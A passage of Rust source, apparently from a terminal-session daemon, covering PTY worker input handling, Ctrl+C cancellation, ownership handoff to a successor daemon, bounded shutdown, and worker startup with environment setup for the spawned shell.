            .lock()
            .unwrap_or_else(|error| error.into_inner());
        published.output_armed.store(true, Ordering::Release);
        activity.map_or(0, |fact| fact.sequence)
    }

    pub(crate) fn stop_observing_output(&self) {
        self.inner
            .published
            .output_armed
            .store(false, Ordering::Release);
    }

    pub fn events(&self) -> Receiver<TerminalEvent> {
        self.inner.events.clone()
    }

    pub fn input(&self, bytes: impl Into<Vec<u8>>) -> Result<(), TerminalSendError> {
        let bytes = bytes.into();
        if bytes == [3] {
            return self.try_command(Command::Interrupt(None));
        }
        self.try_command(Command::Input(bytes))
    }

    pub fn paste(
        &self,
        text: impl Into<String>,
        origin: PasteOrigin,
    ) -> Result<(), TerminalSendError> {
        self.try_command(Command::Paste(text.into(), origin))
    }

    pub fn key(&self, key: KeyInput) -> Result<(), TerminalSendError> {
        if key.action != KeyAction::Release && is_interrupt_key(&key) {
            return self.try_command(Command::Interrupt(Some(key)));
        }
        self.try_command(Command::Key(key))
    }

    pub fn mouse(&self, mouse: MouseInput) -> Result<(), TerminalSendError> {
        self.try_command(Command::Mouse(mouse))
    }

    pub fn focus(&self, focused: bool) -> Result<(), TerminalSendError> {
        self.try_command(Command::Focus(focused))
    }

    pub fn resize(&self, size: TerminalSize) -> Result<(), TerminalSendError> {
        self.try_command(Command::Resize(size))
    }

    pub fn scroll_lines(&self, delta: isize) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Delta(delta)))
    }

    pub fn scroll_to_top(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Top))
    }

    pub fn scroll_to_bottom(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Bottom))
    }

    pub fn scroll_to_row(&self, row: usize) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Row(row)))
    }

    pub fn set_theme(&self, theme: TerminalTheme) -> Result<(), TerminalSendError> {
        self.try_command(Command::SetTheme(theme))
    }
    pub fn clear_scrollback(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::ClearScrollback)
    }
    pub fn copy_selection(
        &self,
        request: uuid::Uuid,
        selection: super::SearchMatch,
    ) -> Result<(), TerminalSendError> {
        self.try_command(Command::CopySelection { request, selection })
    }

    pub fn search(
        &self,
        request: u64,
        query: String,
        case_sensitive: bool,
    ) -> Result<(), TerminalSendError> {
        self.search_for(None, request, query, case_sensitive)
    }

    pub(crate) fn search_for(
        &self,
        owner: Option<u64>,
        request: u64,
        query: String,
        case_sensitive: bool,
    ) -> Result<(), TerminalSendError> {
        let latest = self.inner.published.prepare_search(owner, request);
        self.try_command(Command::Search {
            owner,
            request,
            query,
            case_sensitive,
            latest,
        })
    }

    pub(crate) fn set_archived_event_observer(
        &self,
        observer: impl Fn(&TerminalHandle, TerminalEvent) + Send + Sync + 'static,
    ) {
        let handle = Arc::downgrade(&self.inner);
        let _ = self
            .inner
            .published
            .archive_observer
            .set(Arc::new(move |event| {
                if let Some(inner) = handle.upgrade() {
                    observer(&TerminalHandle { inner }, event);
                }
            }));
    }

    pub(crate) fn set_host_visibility(
        &self,
        visibility: super::ipc::TerminalVisibility,
    ) -> Result<(), TerminalSendError> {
        self.try_command(Command::HostVisibility(match visibility {
            super::ipc::TerminalVisibility::Visible => Visibility::Visible,
            super::ipc::TerminalVisibility::Hidden => Visibility::Hidden,
            super::ipc::TerminalVisibility::Hibernated => Visibility::Hibernated,
        }))
    }

    pub fn hide(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Hide)
    }

    pub fn reveal(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Reveal)
    }

    pub fn hibernate(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Hibernate)
    }

    pub fn restore(&self, visible: bool) -> Result<(), TerminalSendError> {
        self.try_command(Command::Restore { visible })
    }

    /// Resolve fresh foreground evidence on the PTY owner thread. This never
    /// sends terminal input or starts a provider process.
    pub(crate) fn observe_agent(&self) -> Result<Option<String>, String> {
        let (sender, receiver) = crossbeam_channel::bounded(1);
        self.try_command(Command::ObserveAgent(sender))
            .map_err(|error| error.to_string())?;
        receiver
            .recv_timeout(std::time::Duration::from_secs(3))
            .map_err(|error| format!("Cannot inspect the active agent: {error}"))
    }

    /// Call with host control admission excluded, before committing an
    /// upgrade. Kernel-admitted bytes survive on the original PTY; bytes still
    /// in this parser cannot be silently discarded with its replacement.
    pub(crate) fn check_input_drained(&self) -> Result<(), String> {
        let (reply, result) = crossbeam_channel::bounded(1);
        self.try_command(Command::CheckInputDrained(reply)).map_err(|error| error.to_string())?;
        result.recv_timeout(Duration::from_secs(3))
            .map_err(|error| format!("Cannot verify terminal input before upgrade: {error}"))?
    }

    pub(crate) fn prepare_upgrade(&self) -> Result<UpgradeSnapshot, String> {
        let (sender, receiver) = crossbeam_channel::bounded(1);
        self.try_command(Command::PrepareUpgrade(sender))
            .map_err(|error| error.to_string())?;
        receiver
            .recv_timeout(std::time::Duration::from_secs(5))
            .map_err(|error| format!("Cannot freeze terminal for upgrade: {error}"))?
    }

    /// Leaves the terminal running under its holder for a successor daemon
    /// to [adopt](TerminalConfig::adoption) from `socket`, with its screen as
    /// this worker last drew it. The worker then ends without touching the
    /// terminal's processes. On failure its processes stay here, though a
    /// full-screen program's display may need redrawing.
    ///
    /// Every queue, reply and cleanup wait is bounded. A timed-out reply is
    /// reported as an unknown carry outcome; it never authorizes killing a
    /// terminal that may already belong to a successor.
    pub(crate) fn carry(&self, socket: PathBuf) -> Result<Carried, String> {
        {
            let mut order = self.inner.published.input_order.lock().unwrap_or_else(|p| p.into_inner());
            if order.handoff || order.closing { return Err("Terminal ownership is already changing or stopping".into()); }
            order.handoff = true;
        }
        let reopen = || self.inner.published.input_order.lock().unwrap_or_else(|p| p.into_inner()).handoff = false;
        let (reply, result) = crossbeam_channel::bounded(1);
        if let Err(error) = self.send_command(Command::Carry { socket, reply }) {
            reopen();
            return Err(error.to_string());
        }
        let carried = match result.recv_timeout(WORKER_JOIN_TIMEOUT * 2) {
            Ok(Ok(carried)) => carried,
            Ok(Err(error)) => { reopen(); return Err(error); }
            // A timeout cannot prove this worker still owns the PTY. Keep
            // admission fenced; never acknowledge input that might be lost.
            Err(_) => return Err("terminal carry outcome is unknown after its deadline".into()),
        };
        let deadline = std::time::Instant::now() + WORKER_JOIN_TIMEOUT;
        if !self.join_worker_until(deadline, false) {
            return Err("terminal carry cleanup is pending or exceeded its deadline".into());
        }
        Ok(carried)
    }

    /// Resident advisory activity only; never freeze processes, materialize
    /// history, enqueue worker commands or authorize closing a live shell.
    pub(crate) fn close_observation(&self) -> Result<(u64, bool), String> {
        self.inner.published.close_observation()
    }

    /// Atomically fence input, priority interrupts and ownership changes on
    /// this exact worker, then publish its internal stop control. No cleanup
    /// wait or process inspection occurs while the caller holds admission.
    pub(crate) fn fence_session_stop(&self, instance: uuid::Uuid, deadline: std::time::Instant) -> Result<TerminalSessionStop, String> {
        let published = &self.inner.published;
        let phase = published.archive.lock().unwrap_or_else(|p|p.into_inner());
        let mut order = published.input_order.lock().unwrap_or_else(|p|p.into_inner());
        if published.execution_instance != instance {
            return Err("The terminal worker was replaced; its replacement was preserved".into());
        }
        if order.handoff || matches!(*phase, ArchivePhase::Preparing) {
            return Err("Terminal ownership is changing; refresh before stopping it".into());
        }
        let (reply, result) = crossbeam_channel::bounded(1);
        if published.completed.load(Ordering::Acquire) {
            order.closing = true;
            let _ = reply.send(super::ipc::TerminalCloseResult::Closed);
        } else {
            if !matches!(*phase, ArchivePhase::Live) {
                return Err("Terminal ownership is not live or confirmed complete".into());
            }
            let mut priority = published.priority_close.lock().unwrap_or_else(|p|p.into_inner());
            if priority.is_some() { return Err("A terminal close is already pending; refresh after it settles".into()); }
            order.closing = true;
            *priority = Some(Command::StopSession {instance, deadline, reply});
            let _ = published.capture_tx.try_send(());
        }
        Ok(TerminalSessionStop {handle:self.clone(),result})
    }

    /// Terminal providers currently expose no authoritative turn revision or
    /// shell-builtin idle proof. Live work remains protected until they do.
    pub(crate) fn close_if_revision(&self, revision: u64) -> Result<(), String> {
        if self.is_completed() {
            return self.shutdown().map_err(|error| error.to_string());
        }
        let (reply, result) = crossbeam_channel::bounded(1);
        self.try_command(Command::CloseIfRevision {
            revision,
            reply,
        }).map_err(|error| error.to_string())?;
        result.recv_timeout(Duration::from_secs(3)).map_err(|_| "Terminal close outcome is unconfirmed; refresh its census before retrying".to_owned())??;
        // A future successful owner command must fence admission and confirm teardown.
        self.shutdown().map_err(|error| error.to_string())
    }

    /// Inspection and the close decision are one serialized PTY-owner command.
    pub(crate) fn close_checked(&self, allow_active: bool) -> super::ipc::TerminalCloseResult {
        use super::ipc::TerminalCloseResult;
        if self.is_completed() {
            self.release_completed_holder();
            return TerminalCloseResult::Closed;
        }
        let (reply, result) = crossbeam_channel::bounded(1);
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
        if let Err(error) = self.try_command(Command::CloseChecked {
            allow_active,
            deadline,
            reply,
        }) {
            if error == TerminalSendError::Closed
                && matches!(
                    *self
                        .inner
                        .published
                        .archive
                        .lock()
                        .unwrap_or_else(|p| p.into_inner()),
                    ArchivePhase::Frozen { .. }
                )
            {
                return match self.shutdown() {
                    Ok(()) => TerminalCloseResult::Closed,
                    Err(error) => TerminalCloseResult::Unknown(error.to_string()),
                };
            }
            return TerminalCloseResult::Unknown(error.to_string());
        }
        let outcome = result
            .recv_timeout(std::time::Duration::from_secs(3))
            .unwrap_or_else(|error| TerminalCloseResult::Unknown(error.to_string()));
        if matches!(outcome, TerminalCloseResult::Unknown(_))
            && matches!(
                *self
                    .inner
                    .published
                    .archive
                    .lock()
                    .unwrap_or_else(|p| p.into_inner()),
                ArchivePhase::Frozen { .. }
            )
        {
            return match self.shutdown() {
                Ok(()) => TerminalCloseResult::Closed,
                Err(error) => TerminalCloseResult::Unknown(error.to_string()),
            };
        }
        if outcome == TerminalCloseResult::Closed {
            // Completion is not reported until the owner has released its PTY.
            let deadline = std::time::Instant::now() + WORKER_JOIN_TIMEOUT;
            if !self.join_worker_until(deadline, true) {
                return TerminalCloseResult::Unknown(
                    "Terminal worker close is still pending; its exact join owner is retained".into(),
                );
            }
        }
        outcome
    }

    /// Starts shutdown before joining any workers, so a daemon with many
    /// terminals lets all roots handle their hangups concurrently.
    pub(crate) fn request_shutdown(&self) {
        self.inner.published.request_shutdown();
    }

    pub fn shutdown(&self) -> Result<(), TerminalSendError> {
        self.request_shutdown();
        let deadline = std::time::Instant::now() + WORKER_JOIN_TIMEOUT;
        if !self.join_worker_until(deadline, true) {
            return Err(TerminalSendError::Closed);
        }
        if self.is_completed() {
            self.release_completed_holder();
            Ok(())
        } else {
            Err(TerminalSendError::Closed)
        }
    }

    /// The caller first fences the exact source against this retained worker.
    /// A holder receipt, not an absent worker, proves the paired cleanup after
    /// a daemon restart or lost reply.
    pub(crate) fn close_with_receipt(
        &self,
        source: &TerminalSession,
        proof: &crate::model::HostSessionProof,
    ) -> Result<(), String> {
        super::holder::cleanup::authorize(proof)?;
        let expected = self
            .holder_identity()
            .ok_or("The paired terminal has no authenticated holder identity")?;
        match self.close_checked(true) {
            super::ipc::TerminalCloseResult::Closed => {}
            other => return Err(format!("Paired terminal close is unconfirmed: {other:?}")),
        }
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        loop {
            if super::holder::cleanup::confirmed(source, expected, proof)? {
                return Ok(());
            }
            if std::time::Instant::now() >= deadline {
                return Err("The exact terminal holder has not proved its release".into());
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    fn release_completed_holder(&self) {
        *self
            .inner
            .published
            .archive
            .lock()
            .unwrap_or_else(|p| p.into_inner()) = ArchivePhase::Released;
        self.inner.published.archive_ready.notify_all();
        let holder = self
            .inner
            .published
            .retained_holder
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .take();
        drop(holder);
    }

    pub(crate) fn preserve_completed_for_restart(&self) {
        let holder = self
            .inner
            .published
            .retained_holder
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .take();
        if let Some(mut holder) = holder {
            holder.leave_for_successor();
        }
    }

    /// Failed checkpoint restoration must never release an adopted registered
    /// holder. Serialize with completion, then transfer any final retained
    /// screen; a live parser that cannot serialize is honestly screen-lost.
    pub(crate) fn preserve_for_restart(&self) -> Result<(), String> {
        {
            let mut order=self.inner.published.input_order.lock().unwrap_or_else(|p|p.into_inner());
            if order.closing || order.handoff {
                return Err("Terminal session stop or ownership transition already owns admission".into());
            }
            order.handoff=true;
        }
        let (reply, result) = crossbeam_channel::bounded(1);
        if let Err(error)=self.send_command(Command::PreserveForRestart(reply)) {
            // A failed enqueue is a known refusal. Once admitted, an unknown
            // outcome must retain the handoff fence and its exact owner.
            self.inner.published.input_order.lock().unwrap_or_else(|p|p.into_inner()).handoff=false;
            return Err(error.to_string());
        }
        result.recv_timeout(WORKER_JOIN_TIMEOUT * 2)
            .map_err(|_|"Terminal preservation outcome is unknown; ownership remains fenced".to_string())??;
        let deadline = std::time::Instant::now() + WORKER_JOIN_TIMEOUT;
        if !self.join_worker_until(deadline, false) {
            return Err("terminal preservation join is pending or exceeded its deadline".into());
        }
        self.preserve_completed_for_restart();
        Ok(())
    }

    fn join_worker_until(&self, deadline: std::time::Instant, escalate: bool) -> bool {
        joins::join_until(&self.inner.worker, &self.inner.published, deadline, escalate, true)
    }

    fn try_command(&self, command: Command) -> Result<(), TerminalSendError> {
        // Enqueue and archive preparation share this lock. No accepted query
        // can land between the final drain and worker teardown.
        let published = &self.inner.published;
        let mut phase = published.archive.lock().unwrap_or_else(|p| p.into_inner());
        if matches!(*phase, ArchivePhase::Preparing)
            && let Command::HostVisibility(visibility) = &command
        {
            published
                .visible
                .store(*visibility == Visibility::Visible, Ordering::Release);
            return Ok(());
        }
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        while matches!(*phase, ArchivePhase::Preparing) {
            let remaining = deadline.saturating_duration_since(std::time::Instant::now());
            if remaining.is_zero() {
                return Err(TerminalSendError::Closed);
            }
            let (next, timeout) = published
                .archive_ready
                .wait_timeout(phase, remaining)
                .unwrap_or_else(|p| p.into_inner());
            phase = next;
            if timeout.timed_out() && matches!(*phase, ArchivePhase::Preparing) {
                return Err(TerminalSendError::Closed);
            }
        }
        if matches!(*phase, ArchivePhase::Frozen { .. }) {
            drop(phase);
            return published.archived_command(command);
        }
        if matches!(*phase, ArchivePhase::Released) {
            return Err(TerminalSendError::Closed);
        }
        if matches!(
            command,
            Command::Interrupt(_) | Command::CloseChecked { .. }
        ) {
            let finished = self
                .inner
                .worker
                .try_lock()
                .ok()
                .is_some_and(|worker| worker.as_ref().is_some_and(JoinHandle::is_finished));
            if finished || published.completed.load(Ordering::Acquire) {
                return Err(TerminalSendError::Closed);
            }
        }
        if let Command::Interrupt(key) = command {
            return if published.request_interrupt(key) { Ok(()) } else { Err(TerminalSendError::Closed) };
        }
        // Serialize input admission with the priority cancellation boundary.
        // Commands submitted after Ctrl+C must survive its queue drain.
        let mut order = self
            .inner
            .published
            .input_order
            .lock()
            .unwrap_or_else(|p| p.into_inner());
        if order.handoff || order.closing { return Err(TerminalSendError::Closed); }
        if matches!(command, Command::CloseChecked { .. }) {
            let mut priority = published
                .priority_close
                .lock()
                .unwrap_or_else(|p| p.into_inner());
            if priority.is_some() {
                return Err(TerminalSendError::Full);
            }
            *priority = Some(command);
            let _ = published.capture_tx.try_send(());
            return Ok(());
        }
        let input = matches!(command, Command::Input(_) | Command::Paste(..) | Command::Key(_) | Command::Mouse(_));
        if input && order.closing { return Err(TerminalSendError::Closed); }
        let command = if input {
            Command::OrderedInput {
                generation: order.generation,
                input: Box::new(command),
            }
        } else {
            command
        };
        self.inner
            .commands
            .try_send(command)
            .map_err(|error| match error {
                TrySendError::Full(_) => TerminalSendError::Full,
                TrySendError::Disconnected(_) => TerminalSendError::Closed,
            })?;
        if input { order.close_revision = order.close_revision.checked_add(1).expect("terminal close revision exhausted"); }
        Ok(())
    }

    fn send_command(&self, command: Command) -> Result<(), TerminalSendError> {
        self.inner
            .commands
            .send_timeout(command, WORKER_JOIN_TIMEOUT)
            .map_err(|error| match error {
                crossbeam_channel::SendTimeoutError::Timeout(_) => TerminalSendError::Full,
                crossbeam_channel::SendTimeoutError::Disconnected(_) => TerminalSendError::Closed,
            })
    }
}

fn is_interrupt_key(key: &KeyInput) -> bool {
    key.modifiers.control
        && !key.modifiers.alt
        && !key.modifiers.super_key
        && matches!(key.key, TerminalKey::Character('c' | 'C'))
}

fn is_cancelable_input_before(command: &Command, boundary: u64) -> bool {
    match command {
        Command::OrderedInput { generation, input } => {
            *generation < boundary && is_cancelable_input_before(input, boundary)
        }
        // A press may already be consumed. Preserve key and button releases
        // while canceling bulk input, so raw/extended apps never keep a key or
        // button pressed merely because Ctrl+C overtook its queued release.
        Command::Key(key) if key.action == KeyAction::Release => false,
        Command::Mouse(mouse) if mouse.action == MouseAction::Release => false,
        Command::Input(_) | Command::Paste(..) | Command::Key(_) | Command::Mouse(_) => true,
        _ => false,
    }
}

fn command_channel(capacity: usize) -> (Sender<Command>, Receiver<Command>) {
    crossbeam_channel::bounded(capacity.max(1))
}

struct WorkerCompletion {
    event: Option<TerminalEvent>,
    /// A confirmed root exit or already-committed carry released ownership.
    ownership_released: bool,
}

struct Worker {
    terminal_id: crate::model::TerminalId,
    launch: LaunchRecipe,
    resume_hint: Option<String>,
    resume_foreground: Option<libc::pid_t>,
    /// Current timer interval for foreground observation. Grows while the
    /// foreground process group is unchanged and no agent was found.
    foreground_poll: Duration,
    last_foreground_observation: std::time::Instant,
    agent_provider: Option<crate::agent::Provider>,
    agent_process: Option<AgentProcess>,
    display_title: String,
    agent_exited: bool,
    root_exit: Option<TerminalEvent>,
    terminal: Terminal<'static, 'static>,
    theme: Rc<Cell<TerminalTheme>>,
    key_encoder: KeyEncoder<'static>,
    mouse_encoder: MouseEncoder<'static>,
    effects: Rc<RefCell<Effects>>,
    bell: Bell,
    visual: Option<VisualResources>,
    visibility: Visibility,
    generation: u64,
    capture_dirty: bool,
    viewport_reads: Vec<(
        Option<u64>,
        u16,
        Sender<Result<Arc<RenderSnapshot>, String>>,
    )>,
    force_capture: bool,
    /// When a capture was first withheld for the synchronized update still in
    /// progress. `None` while no update is holding the grid back.
    synchronized_since: Option<std::time::Instant>,
    /// Size the widget last asked for; the size a resumed or upgraded terminal
    /// is rebuilt with.
    current_size: TerminalSize,
    /// Sizes actually in effect. A failed ioctl must never be remembered as
    /// applied: the widget re-sends the same steady-state size, and a cached
    /// failure would short-circuit that retry and leave the child on its old
    /// SIGWINCH dimensions forever.
    applied_pty_size: TerminalSize,
    applied_parser_size: TerminalSize,
    commands: Receiver<Command>,
    pty_rx: Receiver<PtyMessage>,
    events: Arc<Sender<TerminalEvent>>,
    transcript: Option<TranscriptWriter>,
    published: Arc<PublishedState>,
    master: holder::PtyMaster,
    writer: File,
    pending_input: VecDeque<u8>,
    retained_commands: VecDeque<Command>,
    child: holder::HeldChild,
    child_exit_rx: Receiver<ChildExit>,
    child_identity: Option<RootIdentity>,
    checked_shutdown: bool,
    /// The terminal was left to its holder for a successor daemon, so ending
    /// this worker must not end its processes.
    carried: bool,
    /// The process that owns this terminal's PTY and reaps its root.
    /// Released last, once nothing here reads or writes the terminal.
    holder: holder::Holder,
    reader: Option<JoinHandle<()>>,
    /// Write end of the reader's wake pipe. Closing it releases a read that a
    /// disowned grandchild would otherwise hold open indefinitely.
    reader_wake: Option<OwnedFd>,
    /// Disconnects when the reader thread returns, so shutdown can wait for
    /// it with a deadline instead of joining unconditionally.
    reader_done: Receiver<()>,
    pty_capacity: usize,
}

/// The thread that reads a terminal's PTY into its worker.
struct Reader {
    thread: JoinHandle<()>,
    start: Option<Sender<()>>,
    /// Closing this releases the reader, however long a read would block.
    wake: OwnedFd,
    done: Receiver<()>,
    output: Receiver<PtyMessage>,
}

impl Reader {
    /// Starts reading `master`, delivering `pending` before anything it reads.
    fn start(
        terminal_id: crate::model::TerminalId,
        master: &holder::PtyMaster,
        capacity: usize,
        pending: Vec<u8>,
    ) -> Result<Self, String> {
        let mut reader = Self::prepare(terminal_id, master, capacity, pending)?;
        reader.activate();
        Ok(reader)
    }

    /// Allocate the reader without consuming PTY output until ownership commits.
    fn prepare(
        terminal_id: crate::model::TerminalId,
        master: &holder::PtyMaster,
        capacity: usize,
        pending: Vec<u8>,
    ) -> Result<Self, String> {
        let duplicate = |purpose: &str| {
            master
                .duplicate()
                .map_err(|error| format!("duplicate PTY descriptor for {purpose}: {error}"))
        };
        let mut reader = File::from(duplicate("reading")?);
        // Closing the master does not release a read already blocked on a
        // duplicate: a PTY master read only fails with EIO once the last slave
        // descriptor closes, which a disowned grandchild can defer forever.
        // Wait for readiness on a descriptor this worker hands over instead,
        // alongside a pipe whose closure is the shutdown signal, so the reader
        // always has a way out.
        let readiness = duplicate("readiness")?;
        let (wake_rx, wake) = wake_pipe()?;
        let (pty_tx, output) = crossbeam_channel::bounded(capacity.max(1));
        if !pending.is_empty() {
            let _ = pty_tx.send(PtyMessage::Bytes(pending));
        }
        let (done_tx, done) = crossbeam_channel::bounded::<()>(0);
        let (start, started) = crossbeam_channel::bounded(1);
        let thread = thread::Builder::new()
            .name(format!("terminal-pty-reader-{terminal_id:?}"))
            .spawn(move || {
                let _done = done_tx;
                if started.recv().is_ok() {
                    read_pty(&mut reader, &pty_tx, readiness, wake_rx);
                }
            })
            .map_err(|error| format!("start PTY reader: {error}"))?;
        Ok(Self {
            thread,
            start: Some(start),
            wake,
            done,
            output,
        })
    }

    fn activate(&mut self) {
        if let Some(start) = self.start.take() {
            let _ = start.send(());
        }
    }
}

impl Worker {
    fn start(
        session: TerminalSession,
        config: TerminalConfig,
        commands: Receiver<Command>,
        events: Sender<TerminalEvent>,
        published: Arc<PublishedState>,
    ) -> Result<Self, String> {
        let current_size = TerminalSize {
            columns: config.columns.max(1),
            rows: config.rows.max(1),
            cell_width_px: config.cell_width_px.max(1),
            cell_height_px: config.cell_height_px.max(1),
        };
        let mut terminal = Terminal::new(TerminalOptions {
            cols: current_size.columns,
            rows: current_size.rows,
            max_scrollback: config.max_scrollback_bytes,
        })
        .map_err(|error| format!("create Ghostty terminal: {error}"))?;
        apply_theme(&mut terminal, config.theme)
            .map_err(|error| format!("configure terminal theme: {error}"))?;
        let theme = Rc::new(Cell::new(config.theme));
        terminal
            .on_color_scheme({
                let theme = Rc::clone(&theme);
                move |_| Some(theme_scheme(theme.get()))
            })
            .map_err(|error| format!("register color scheme query: {error}"))?;

        let effects = Rc::new(RefCell::new(Effects::default()));
        terminal
            .on_pty_write({
                let effects = Rc::clone(&effects);
                move |_terminal, bytes| {
                    effects.borrow_mut().push(Effect::PtyWrite(bytes.to_vec()));
                }
            })
            .map_err(|error| format!("register PTY response effect: {error}"))?;
        terminal
            .on_bell({
                let effects = Rc::clone(&effects);
                move |_terminal| effects.borrow_mut().push(Effect::Bell)
            })
            .map_err(|error| format!("register bell effect: {error}"))?;
        terminal
            .on_title_changed({
                let effects = Rc::clone(&effects);
                move |terminal| {
                    let title = terminal.title().unwrap_or_default().to_owned();
                    effects.borrow_mut().push(Effect::Title(title));
                }
            })
            .map_err(|error| format!("register title effect: {error}"))?;

        terminal
            .on_pwd_changed({
                let effects = Rc::clone(&effects);
                move |_| effects.borrow_mut().push(Effect::WorkingDirectoryChanged)
            })
            .map_err(|error| format!("register working directory effect: {error}"))?;

        let mut command = match &config.execution_environment {
            Some(environment) => {
                let mut command = CommandBuilder::new(&session.launch.program);
                command.args(&session.launch.arguments);
                command.cwd(&session.launch.working_directory);
                command.env_clear();
                for (name, value) in &environment.0 {
                    command.env(name, value);
                }
                scrub_inherited_markers(&mut command);
                terminal_environment(&mut command);
                command
            }
            None => command_from_recipe(&session.launch),
        };
        for name in crate::account::launch_credential_overrides(&session.launch) {
            command.env_remove(name);
        }
        command.env("CAGENTS_TERMINAL_ID", session.id.to_string());
        // A cagents process started in this terminal must not take the
        // account selected for it for the system account.
        match crate::account::registry::selection_marker(|name| {
            command.get_env(name)?.to_str().map(str::to_owned)
        }) {
            Some(marker) => command.env(crate::account::SELECTION_MARKER, marker),
            None => command.env_remove(crate::account::SELECTION_MARKER),
        }
        command.env_remove(crate::agent_execution::AUTHORITY_ENV);
        if let Some(token) = config.agent_authority.token() {
            command.env(crate::agent_execution::AUTHORITY_ENV, token);
        }
        command.env(
            "CAGENTS_RECOVERY_ORIGIN",
            session.recovery_origin.unwrap_or(session.id).to_string(),
        );
        let operational_directory = config.execution_directory.as_ref().map(|directory| {
            PathBuf::from(format!("/proc/self/fd/{}", directory.as_raw_fd()))
        });
        if let Some(directory) = &operational_directory {
            command.cwd(directory);
        }
        let executable = interactive_shell_launch(&session.launch)
            .then(|| RootIdentity::launch_executable(&command))
            .flatten();
        let (child_exit_tx, child_exit_rx) = crossbeam_channel::bounded(1);
        let (mut held, output) = match &config.adoption {
            Some(socket) => {
                let adopted = holder::adopt_recoverable(
                    socket,
                    child_exit_tx,
                    config.holder_recovery.clone(),
                )?;
                // Drawing the screen again is not news, except for the title
                // it sets: whatever it provoked, a reply or a bell, happened
                // when its predecessor drew it.
                terminal.vt_write(&adopted.screen);
                effects.borrow_mut().retain_title();
                if adopted.screen_lost {
                    // A crash has no emulator snapshot. Nudge full-screen
                    // clients to redraw on their surviving controlling PTY.
                    adopted
                        .held
                        .master
                        .request_redraw()
                        .map_err(|error| format!("request surviving terminal redraw: {error}"))?;
                }
                (adopted.held, adopted.output)
            }
            None => {
                let environment = crate::account::Account::PROVIDERS
                    .into_iter()
                    .filter_map(|provider| {
                        let name = crate::account::home_variable(provider)?;
                        Some((name.to_owned(), command.get_env(name)?.to_str()?.to_owned()))
                    })
                    .collect();
                let _account = crate::account::registry::authorize_spawn(&environment, None)
                    .map_err(|error| error.to_string())?;
                let mut skill_environment: std::collections::BTreeMap<String, String> = environment;
                if let Some(home) = command.get_env("HOME").and_then(|value| value.to_str()) {
                    skill_environment.insert("HOME".into(), home.into());
                }
                crate::agent_execution::bundled::install(
                    crate::agent::Provider::from_program(&session.launch.program),
                    &skill_environment,
                    operational_directory.as_deref().unwrap_or(&session.launch.working_directory),
                );
                if let Some(path) = crate::agent_execution::bundled::matched_path(
                    command.get_env("PATH").and_then(|value| value.to_str()),
                ) {
                    command.env("PATH", path);
                }
                (
                    holder::spawn_recoverable_at_directory(
                        command,
                        pty_size(current_size),
                        child_exit_tx,
                        config.holder_recovery.clone(),
                        config.execution_directory.clone(),
                    )?,
                    Vec::new(),
                )
            }
        };
        // The holder reaps the root, so its pid identifies it only while the
        // pidfd still reaches an unreaped process: checked after the capture,
        // that proves the capture read the root and not a reused pid.
        let child_identity = RootIdentity::capture(held.child.pid(), executable)
            .ok()
            .filter(|_| held.child.unreaped());
        if let Some(directory) = child_identity.as_ref().and_then(|root| root.current_directory().ok()) {
            let _ = published.admitted_directory.set(directory);
        }
        let duplicate = |purpose: &str| {
            held.master
                .duplicate()
                .map_err(|error| format!("duplicate PTY descriptor for {purpose}: {error}"))
        };
        let writer = File::from(duplicate("writing")?);
        // Duplicates share the master file description. Reader and detached
        // holder paths also tolerate WouldBlock after readiness races.
        let flags = unsafe { libc::fcntl(writer.as_raw_fd(), libc::F_GETFL) };
        if flags < 0
            || unsafe { libc::fcntl(writer.as_raw_fd(), libc::F_SETFL, flags | libc::O_NONBLOCK) }
                < 0
        {
            return Err(format!(
                "make PTY nonblocking: {}",
                std::io::Error::last_os_error()
            ));
        }
        let _ = published.shutdown_pidfd.set(held.child.shutdown_pidfd()?);
        // Output an adopted terminal produced between daemons comes first, as
        // any other output would.
        let mut reader = Reader::prepare(session.id, &held.master, config.pty_capacity, output)?;

        let mut transcript = session
            .transcript_path
            .map(|path| {
                TranscriptWriter::start(
                    path,
                    session.id,
                    config.transcript_capacity.max(1),
                    config.transcript_max_bytes.max(1),
                )
            })
            .transpose()?;
        if let Some(location) = transcript
            .as_mut()
            .and_then(|writer| writer.location.take())
        {
            let _ = published.transcript_location.set(location);
        }
        let visibility = if config.initially_visible {
            Visibility::Visible
        } else {
            Visibility::Hidden
        };
        let visual = if visibility == Visibility::Visible {
            Some(VisualResources::new().map_err(|error| format!("create render state: {error}"))?)
        } else {
            None
        };
        let key_encoder =
            KeyEncoder::new().map_err(|error| format!("create key encoder: {error}"))?;
        let mouse_encoder =
            MouseEncoder::new().map_err(|error| format!("create mouse encoder: {error}"))?;
        held.holder.commit_adoption()?;
        if let Some(record) = held.holder.record() {
            let _ = published.holder_identity.set(record.clone());
        }
        reader.activate();

        let events = Arc::new(events);
        let _ = published.semantic_events.set(Arc::downgrade(&events));

        Ok(Self {
            terminal_id: session.id,
            resume_hint: crate::model::agent_recovery::observed_hint_from_launch(&session.launch),
            resume_foreground: None,
            foreground_poll: FOREGROUND_POLL_MIN,
            last_foreground_observation: std::time::Instant::now(),
            agent_provider: None,
            agent_process: None,
            display_title: String::new(),
            agent_exited: false,
            root_exit: None,
            launch: session.launch,
            terminal,
            theme,
            key_encoder,
            mouse_encoder,
            effects,
            bell: Bell::default(),
            visual,
            visibility,
            generation: 0,
            capture_dirty: false,
            viewport_reads: Vec::new(),
            force_capture: false,
            synchronized_since: None,
            current_size,
            applied_pty_size: current_size,
            applied_parser_size: current_size,
            commands,
            pty_rx: reader.output,
            events,
            transcript,
            published,
            master: held.master,
            writer,
            pending_input: VecDeque::new(),
            retained_commands: VecDeque::new(),
            child: held.child,
            child_exit_rx,
            child_identity,
            checked_shutdown: false,
            carried: false,
            holder: held.holder,
            pty_capacity: config.pty_capacity,
            reader: Some(reader.thread),
